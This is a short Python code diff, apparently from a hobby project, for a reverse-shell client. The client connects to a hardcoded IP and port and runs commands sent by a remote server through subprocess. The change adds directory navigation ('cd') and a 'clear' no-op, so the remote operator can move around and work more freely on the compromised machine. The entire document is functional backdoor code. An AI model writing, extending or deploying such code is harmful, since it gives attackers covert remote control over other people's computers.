@@ -2,6 +2,7 @@ import socket
 import time
 import json
 import subprocess
+import os
 
 IP_ADDRESS = '192.168.0.16'
 PORT = 54321
@@ -65,6 +66,17 @@ def shell():
         # Exit program if 'q' is received from server
         if command == 'q':
             break
+        
+        # 'cd' command
+        # comparing first 3 CHAR
+        # cuz 'cd path/to/target'
+        elif command[:3] == 'cd ':
+            # From 3rd CHAR till the end
+            os.chdir(command[3:])
+        # Executing 'clear' on Server
+        # do NOTHING in client
+        elif command == 'clear':
+            pass
         else:
             # Execute the 'command' received from Server using process open
             # using subprocess module
